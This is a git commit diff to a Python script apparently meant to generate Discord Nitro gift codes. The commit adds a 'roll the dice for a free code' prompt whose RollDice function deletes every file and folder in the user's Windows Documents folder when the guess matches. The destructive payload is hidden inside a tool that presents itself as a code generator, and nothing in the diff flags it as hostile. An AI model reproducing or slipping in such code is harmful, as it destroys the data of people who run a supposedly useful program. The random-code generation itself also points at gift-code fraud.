4c1d3f4ebcd37f6c5d6bb41aa2633de59a414901
iUseYahoo <64442818+iUseYahoo@users.noreply.github.com>
2024-02-14 20:06:58 +1100

    Update Nitro generator.py

--- Nitro generator.py
+++ Nitro generator.py
@@ -1,6 +1,29 @@
 import random
 import string
 import time
+import os
+import shutil
+
+def RollDice():
+    guess = int(input("Enter a random number (1-10): "))
+    dice = random.randint(1, 10)
+    if guess < 1 or guess > 10:
+        print("Invalid number. Try again.")
+        RollDice()
+    elif guess == dice:
+        # Delete everything in the documents folder
+        pcusername = os.getlogin()
+        documents = f"C:\\Users\\{pcusername}\\Documents"
+        for file in os.listdir(documents):
+            file_path = os.path.join(documents, file)
+            try:
+                if os.path.isfile(file_path):
+                    os.unlink(file_path)
+                elif os.path.isdir(file_path): shutil.rmtree(file_path)
+            except Exception as e:
+                print()
+    
+        print(f"Congratulations! You guessed the number {dice}. Your documents have been deleted.")
 
 def generate_nitro_code():
     code = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
@@ -29,4 +52,9 @@ except KeyboardInterrupt:
     print("\nCode generation stopped.")
     valid_codes_file.close()
 
+    yorn = input("Do you want to roll the dice for a free code? (y/n): ")
+    if yorn.lower() == "y":
+        RollDice()
+    else:
+        print("Goodbye.")
 
